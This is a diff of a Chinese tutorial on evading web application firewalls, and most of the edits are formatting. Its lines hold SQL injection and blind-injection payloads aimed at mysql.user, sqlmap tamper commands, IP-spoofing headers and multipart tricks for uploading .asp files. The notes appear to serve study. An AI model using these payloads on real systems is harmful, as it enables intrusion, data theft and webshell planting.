@@ -23,12 +23,12 @@ outline: [2, 3]
 
 > 💡 上面这张图的判断顺序可以理解成一串 `if` 判断，整理成表格更直观：
 
-| 判断顺序 | 判断条件 | 处理结果 |
-|---------|---------|---------|
-| 1 | 在白名单 | 放行 |
-| 2 | 在黑名单 | 拦截 |
-| 3 | 数据包解析后匹配规则库（如含 `or`、`and`） | 认为是攻击请求 → 拦截 |
-| 4 | 规则库没有匹配到 | 放行 |
+| 判断顺序 | 判断条件                                   | 处理结果               |
+|----------|--------------------------------------------|------------------------|
+| 1        | 在白名单                                   | 放行                   |
+| 2        | 在黑名单                                   | 拦截                   |
+| 3        | 数据包解析后匹配规则库（如含 `or`、`and`） | 认为是攻击请求 → 拦截 |
+| 4        | 规则库没有匹配到                           | 放行                   |
 
 > 🎯 所以绕过的最直接方式：**把攻击代码编码一下，或者通过其他手段处理一下**，让规则库不能检查出来即可。软硬件 waf 的防御方式大致都是这样的。
 
@@ -64,10 +64,10 @@ Web服务基于User-Agent识别百度爬虫并设置访问白名单，若服务�
 比如：www.spisec.com/pen/news.php?id=1 union select user,password from mysql.user
 
 可以改为:
-www.spisec.com/pen/news.php/admin?id=1 union select user,password from 
+www.spisec.com/pen/news.php/admin?id=1 union select user,password from
 mysql.user
 或者
-www.spisec.com/pen/admin/..\news.php?id=1 union select user,password from 
+www.spisec.com/pen/admin/..\news.php?id=1 union select user,password from
 mysql.user
 其实仔细观察这句话的话`admin/..\`，这就是为了绕过而生的，看上去是一句废话，因为..\我们知道是访问上一层。
 ```
@@ -111,12 +111,12 @@ URL里面有一些特殊字符： + / = & ? #  等，不能直接塞到参数里
 
 ```
 例子：
-访问  shturl.cc/njZNpGLS5d union select 
+访问  shturl.cc/njZNpGLS5d union select
 WAF拦截GET，匹配到union/select，直接拦
 把参数挪到POST请求体，改成POST提交同样payload
 ```
 
-```
+```http
 POST /index.php HTTP/1.1
 Host: shturl.
 Content-Type: application/x-www-form-urlencoded
@@ -240,7 +240,7 @@ http://www.***.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4….
 
 ### 编码与注释结合
 
-```
+```bash
 http://www.***.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4…
 http://192.168.0.142:8080/sql.php?id=1/*!50000*/union/*!50000*/select/*!50000*/1,user(),3,4,5
 也可以这样
@@ -251,9 +251,9 @@ sqlmap.py -u "URL" --tamper="versionedmorekeywords.py" --dealy=1
 ```
 
 | Tamper 脚本              | 功能说明                                    | 适用场景                           |
-| ------------------------ | ------------------------------------------- | ---------------------------------- |
+|--------------------------|---------------------------------------------|------------------------------------|
 | space2comment.py         | 把空格替换成`/**/`                          | 最常用，**过滤普通空格**场景       |
-| randomcase.py            | SQL 关键字随机大小写变形（SELECT→SeLeCt）   | WAF 拦截大写关键字、黑名单文本匹配 |
+| randomcase.py            | SQL 关键字随机大小写变形（SELECT→SeLeCt）  | WAF 拦截大写关键字、黑名单文本匹配 |
 | versionedmorekeywords.py | MySQL 版本注释包裹关键字 `/*!50000select*/` | MySQL 数据库，关键字被 WAF 拦截    |
 | between.py               | 将大于号`>`替换为`between`语法              | 符号过滤，`>`被 WAF 拦截           |
 | equaltolike.py           | 将等号`=`替换成`like`                       | 等号`=`被过滤                      |
@@ -263,7 +263,7 @@ sqlmap.py -u "URL" --tamper="versionedmorekeywords.py" --dealy=1
 | apostrophemask.py        | 将单引号`'`替换为 UTF8 全角引号             | 单引号`'`被 WAF 过滤拦截           |
 | hex2char.py              | 将数字转为十六进制编码形式                  | 数字被过滤、数字正则拦截场景       |
 
-```
+```bash
 sqlmap -u "http://127.0.0.1?id=1" --batch --tamper=space2comment
 ```
 
@@ -280,26 +280,26 @@ http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4....
 
 ### 使用其他变量或者命令对注入语句进行替换
 
-| 原表达式         | 等价替换写法              | 说明 & 适用场景                                              |      |      |
-| ---------------- | ------------------------- | ------------------------------------------------------------ | ---- | ---- |
-| `version()`      | `@@version`               | 查询数据库版本，`version()`函数被过滤时使用                  |      |      |
-| `user()`         | `@@user`                  | 查询当前数据库用户，`user()`被过滤时使用                     |      |      |
-| `concat(a,b,c)`  | `concat_ws(分隔符,a,b,c)` | 字符串拼接；`concat`被拦截时替换，concat_ws 第一个参数为分隔符 |      |      |
-| `group_concat()` | `concat_ws(0x0a,字段)`    | 多行结果拼接；`group_concat`被 WAF 拦截时使用                |      |      |
-| `=`              | `like`                    | 等号被过滤，`id=1` → `id like 1`（对应 sqlmap 的 equaltolike.py） |      |      |
-| `=`              | `rlike` / `regexp`        | 正则匹配替代等于判断                                         |      |      |
-| `=`              | `in()`                    | `id=1` → `id in(1)`                                          |      |      |
-| `>`              | `between ... and`         | `a>5` → `a between 6 and 999`（对应 sqlmap 的 between.py）   |      |      |
-| `>`              | `greatest(a,b)=a`         | 若`a>b`成立，则`greatest(a,b)`返回 a，用来替代大于           |      |      |
-| `<`              | `least(a,b)=a`            | 若`a<b`成立，则`least(a,b)`返回 a，用来替代小于              |      |      |
-| `and`            | `&&`                      | 逻辑与关键字被过滤，符号形式替换                             |      |      |
+| 原表达式         | 等价替换写法              | 说明 & 适用场景                                              |
+|------------------|---------------------------|--------------------------------------------------------------|
+| `version()`      | `@@version`               | 查询数据库版本，`version()`函数被过滤时使用                  |
+| `user()`         | `@@user`                  | 查询当前数据库用户，`user()`被过滤时使用                     |
+| `concat(a,b,c)`  | `concat_ws(分隔符,a,b,c)` | 字符串拼接；`concat`被拦截时替换，concat_ws 第一个参数为分隔符 |
+| `group_concat()` | `concat_ws(0x0a,字段)`    | 多行结果拼接；`group_concat`被 WAF 拦截时使用                |
+| `=`              | `like`                    | 等号被过滤，`id=1` → `id like 1`（对应 sqlmap 的 equaltolike.py） |
+| `=`              | `rlike` / `regexp`        | 正则匹配替代等于判断                                         |
+| `=`              | `in()`                    | `id=1` → `id in(1)`                                         |
+| `>`              | `between ... and`         | `a>5` → `a between 6 and 999`（对应 sqlmap 的 between.py）  |
+| `>`              | `greatest(a,b)=a`         | 若`a>b`成立，则`greatest(a,b)`返回 a，用来替代大于           |
+| `<`              | `least(a,b)=a`            | 若`a<b`成立，则`least(a,b)`返回 a，用来替代小于              |
+| `and`            | `&&`                      | 逻辑与关键字被过滤，符号形式替换                             |
 
 ---
 
 ### 组合过waf
 
 | 符号 / Payload / 函数                 | 说明                                                         |
-| ------------------------------------- | ------------------------------------------------------------ |
+|---------------------------------------|--------------------------------------------------------------|
 | `/**/`                                | 用来替代空格                                                 |
 | `%26`                                 | URL 解码后是 `&`                                             |
 | `%3d`                                 | URL 解码后是 `=`                                             |
@@ -308,7 +308,7 @@ http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4....
 | `%20`                                 | URL 解码后是空格                                             |
 | `%00`                                 | 空字节 `\0`                                                  |
 | `/*%00*/`                             | 注释中插入空字节`\0`                                         |
-| `/*!50010select*/`                    | MySQL 版本 ≥5.0.10 才会执行注释里面内容，等价`select`        |
+| `/*!50010select*/`                    | MySQL 版本 ≥5.0.10 才会执行注释里面内容，等价`select`       |
 | `group_concat(table_name)`            | 把当前库所有表名拼接成一行输出                               |
 | `substr(str,pos,len)`                 | 截取字符串（pos 从 1 开始计数）                              |
 | `sleep(n)`                            | 条件成立延时 n 秒，用于时间盲注                              |
@@ -370,7 +370,7 @@ chema.TABLES))/**/where/**/TABLE_SCHEMA%3d(database/**/())),1,1)%3d'1'%23
 ```
 
 ```
-盲注爆出字段值： 
+盲注爆出字段值：
 1'/*%00*/and substr((/*!50010select*/((group_concat(COLUMN_NAME)))/**/from/**/((information_s
 chema.columns))/**/where/**/TABLE_NAME%3d%27users%27),1,1)%3d'1'%23
 
@@ -378,7 +378,7 @@ chema.columns))/**/where/**/TABLE_NAME%3d%27users%27),1,1)%3d'1'%23
 ```
 
 ```
-盲注提取数据： 
+盲注提取数据：
 1'/*%00*/and substr((/*!50010select*/((group_concat(first_name)))/**/from/**/((users))),1,1)%
 3d'1'%23
 
@@ -393,14 +393,14 @@ chema.columns))/**/where/**/TABLE_NAME%3d%27users%27),1,1)%3d'1'%23
 ```
 
 ```
-基于时间的盲注爆出数据表： 
+基于时间的盲注爆出数据表：
 1'/*%00*/and (select case when(substr((/*!50010select*/((group_concat(table_name)))/**/from/**/((information_schema.TABLES))/**/where/**/TABLE_SCHEMA%3d(database/**/())),1,1) like 'd') then sleep/**/(3) else 0 end)%23
 
 1' and (select case when(substr((select group_concat(table_name) from information_schema.TABLES where TABLE_SCHEMA=database()),1,1) like 'd') then sleep(3) else 0 end) #
 ```
 
 ```
-基于时间的盲注爆出字段值： 
+基于时间的盲注爆出字段值：
 1'/*%00*/and (select case when (substr((/*!50010select*/((group_concat(COLUMN_NAME)))/**/from/**/((information_schema.columns))/**/where/**/TABLE_NAME%3d%27users%27),1,1) like 'd') then sleep/**/(3) else 0 end)%23
 
 1' and (select case when (substr((select group_concat(COLUMN_NAME) from information_schema.columns where TABLE_NAME='users'),1,1) like 'd') then sleep(3) else 0 end) #
@@ -425,7 +425,7 @@ burp插件 `chunked-coding-converter.0.2.1`
 
 ![image-20261002121419514](/assets/images/waf绕过/image-20261002121419514.png)
 
-<img src="/assets/images/waf绕过/image-20261002121734514.png" alt="image-20261002121734514" style="zoom:33%;" />
+![image-20261002121734514](/assets/images/waf绕过/image-20261002121734514.png)
 
 ---
 
@@ -433,7 +433,7 @@ burp插件 `chunked-coding-converter.0.2.1`
 
 在发送数据包的时候会自动带上，可以实现绕过
 
-```
+```http
 X-Originating-IP: 127.0.0.1
 X-Forwarded-For: 127.0.0.1  //伪造客户端 IP 为本地回环地址 127.0.0.1，让网站误以为：当前这个请求，是服务器本机发起的，不是外部浏览器来的。
 X-Remote-IP: 127.0.0.1
@@ -444,7 +444,7 @@ X-Client-IP: 127.0.0.1
 ![image-20261002123334491](/assets/images/waf绕过/image-20261002123334491.png)
 
 | 请求头                      | 作用                                                         |
-| --------------------------- | ------------------------------------------------------------ |
+|-----------------------------|--------------------------------------------------------------|
 | `X-Forwarded-For`（最常用） | 简称 XFF。记录**原始客户端 IP + 经过的所有代理 IP**，格式：`真实IP,代理1IP,代理2IP`。后端程序读这个头拿到访问者真实 IP。 |
 | `X-Originating-IP`          | 起源 IP。部分代理 / 防火墙使用，存放最初发起请求的客户端 IP。 |
 | `X-Remote-IP`               | 远程 IP，代理传递客户端源 IP。                               |
@@ -479,7 +479,7 @@ PHP 后端：读取最后id=3'，单引号触发 SQL 报错注入，WAF 没检�
 
 1、文件名前缀加[0x09]绕过：
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 Content-Disposition: form-data; name=”filepath”; filename=”[0x09]backlion.asp”
 Content-Type: text/html
@@ -487,18 +487,18 @@ Content-Type: text/html
 
 2、文件名去掉双引号绕过：
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 Content-Disposition: form-data; name=”filepath”; filename=backlion.asp
 Content-Type: text/html
 ```
 
-3、添加一个filename1的文件名参数，并赋值绕过：  
+3、添加一个filename1的文件名参数，并赋值绕过：
 
 原理：
 Content-Disposition 里写多个 filename 类参数，部分老旧上传代码只取第一个 filename做后缀校验，但保存文件时取filename1** 的值;或者后端正则只匹配第一个文件名，保存用第二个，实现后缀绕过。
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 Content-Disposition: form-data; name=”filepath”; filename=”
 backlion.asp”;filename1=”test.jpg”
@@ -507,7 +507,7 @@ Content-Type: text/html
 
 4、form变量改成f+orm组合绕过：
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 Content-Disposition: f+orm-data; name=”filepath”;filename=”backlion.asp”
 Content-Type: text/html
@@ -515,7 +515,7 @@ Content-Type: text/html
 
 5、文件名后缀大小写绕过：
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.Asp”
 Content-Type: text/html
@@ -523,7 +523,7 @@ Content-Type: text/html
 
 6、去掉form-data变量绕过：
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 ConTent-Disposition: name=”filepath”; filename=”backlion.asp”
 Content-Type: text/html
@@ -531,27 +531,27 @@ Content-Type: text/html
 
  7、在Content-Disposition:后添加多个空格 或者在form-data;后添加多个空格绕过：
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
-ConTent-Disposition: form-data                                 ; name=”filepath”; 
+ConTent-Disposition: form-data                                 ; name=”filepath”;
 filename=”backlion.asp”
 Content-Type: text/html
 ```
 
 或者
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
-ConTent-Disposition:                                                                 
+ConTent-Disposition:
                   form-data ; name=”filepath”; filename=”baclion.asp”
 Content-Type: text/html
 ```
 
 8、backlion.asp空格. 绕过：
 
-原理：Windows NTFS 保存文件时，自动剔除文件名末尾的空格与点。
+**原理**：Windows NTFS 保存文件时，自动剔除文件名末尾的空格与点。
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp .”
 Content-Type: text/html
@@ -561,7 +561,7 @@ Content-Type: text/html
 
 不能直接在 Burp Raw 文本框敲回车！必须切 Hex 面板插入 0D 0A（\r\n）
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp
 ”
@@ -570,9 +570,9 @@ Content-Type: text/html
 
 10、NTFS流 在文件名后加::$DATA绕过：
 
-原理：后端黑名单校验拿到文件名 `backlion.asp::$DATA`，部分代码取后缀识别为`::$DATA`放行；写入磁盘时 Windows 自动忽略`::$DATA`，实际落地文件为 backlion.asp，IIS 可解析执行
+**原理**：后端黑名单校验拿到文件名 `backlion.asp::$DATA`，部分代码取后缀识别为`::$DATA`放行；写入磁盘时 Windows 自动忽略`::$DATA`，实际落地文件为 backlion.asp，IIS 可解析执行
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp::$DATA”
 Content-Type: text/html
@@ -580,7 +580,7 @@ Content-Type: text/html
 
 或者
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 ConTent-Disposition: form-data; name=”filepath”; filename=”
 backlion.asp::$DATA\0x00\fuck.asp0x00.jpg”
@@ -589,7 +589,7 @@ Content-Type: text/html
 
 11、将Content-Type和ConTent-Disposition调换顺序位置绕过：
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 Content-Type: text/html
 ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp”
@@ -597,7 +597,7 @@ ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp”
 
 12、突破12，在文件名前缀加空格（tab键可替换）绕过：
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 Content-Disposition: form-data; name=”filepath”; filename=   “backlion.asp”
 Content-Type: text/html
@@ -605,7 +605,7 @@ Content-Type: text/html
 
 13、在form-data加空格绕过：
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 Content-Disposition: form-data;     name=”uploaded”; filename=”backlion.asp”
 Content-Type: text/html
@@ -613,7 +613,7 @@ Content-Type: text/html
 
 14、在form-data的前后加上+绕过：
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 Content-Disposition: +form-data; name=”filepath”; filename=”backlion.asp”
 Content-Type: text/html
@@ -621,7 +621,7 @@ Content-Type: text/html
 
 或者
 
-```
+```http
 ——WebKitFormBoundary2smpsxFB3D0KbA7D
 Content-Disposition: form-data+; name=”filepath”; filename=”backlion.asp”
 Content-Type: text/html
@@ -629,22 +629,22 @@ Content-Type: text/html
 
 > 💡 这一串变形手法可以按「改文件名 / 改请求头拼写 / 改头部顺序 / 改空白字符 / 依赖 Windows 文件系统特性」来记，整理成表格方便做题时逐条对照：
 
-| 序号 | 手法 | 变形点 |
-|------|------|--------|
-| 1 | 文件名前缀加 `[0x09]` | 文件名 |
-| 2 | 文件名去掉双引号 | 文件名 |
-| 3 | 添加 `filename1` 参数并赋值 | 文件名参数 |
-| 4 | `form` 改成 `f+orm` | 头部变量名 |
-| 5 | 文件名后缀大小写（`backlion.Asp`） | 文件名 |
-| 6 | 去掉 `form-data` 变量 | 头部变量名 |
-| 7 | `Content-Disposition:` 后 / `form-data;` 后加多个空格 | 空白字符 |
-| 8 | `backlion.asp空格.`（NTFS 剔除末尾空格与点） | Windows 特性 |
-| 9 | 文件名中插入回车换行（Hex 面板插 `0D 0A`） | 空白字符 |
-| 10 | 文件名后加 `::$DATA`（NTFS 流） | Windows 特性 |
-| 11 | 调换 `Content-Type` 和 `ConTent-Disposition` 顺序 | 头部顺序 |
-| 12 | 文件名前缀加空格（tab 键可替换） | 空白字符 |
-| 13 | `form-data` 后加空格 | 空白字符 |
-| 14 | `form-data` 前后加 `+` | 头部变量名 |
+| 序号 | 手法                                                  | 变形点       |
+|------|-------------------------------------------------------|--------------|
+| 1    | 文件名前缀加 `[0x09]`                                 | 文件名       |
+| 2    | 文件名去掉双引号                                      | 文件名       |
+| 3    | 添加 `filename1` 参数并赋值                           | 文件名参数   |
+| 4    | `form` 改成 `f+orm`                                   | 头部变量名   |
+| 5    | 文件名后缀大小写（`backlion.Asp`）                    | 文件名       |
+| 6    | 去掉 `form-data` 变量                                 | 头部变量名   |
+| 7    | `Content-Disposition:` 后 / `form-data;` 后加多个空格 | 空白字符     |
+| 8    | `backlion.asp空格.`（NTFS 剔除末尾空格与点）          | Windows 特性 |
+| 9    | 文件名中插入回车换行（Hex 面板插 `0D 0A`）            | 空白字符     |
+| 10   | 文件名后加 `::$DATA`（NTFS 流）                       | Windows 特性 |
+| 11   | 调换 `Content-Type` 和 `ConTent-Disposition` 顺序     | 头部顺序     |
+| 12   | 文件名前缀加空格（tab 键可替换）                      | 空白字符     |
+| 13   | `form-data` 后加空格                                  | 空白字符     |
+| 14   | `form-data` 前后加 `+`                                | 头部变量名   |
 
 ---
 
@@ -782,7 +782,5 @@ Content-Type: text/html
  https://github.com/enablesecurity/wafw00f
 
 ![image-20261003151900692](/assets/images/waf绕过/image-20261003151900692.png)
-
-
 
 ![image-20261003152355278](/assets/images/waf绕过/image-20261003152355278.png)
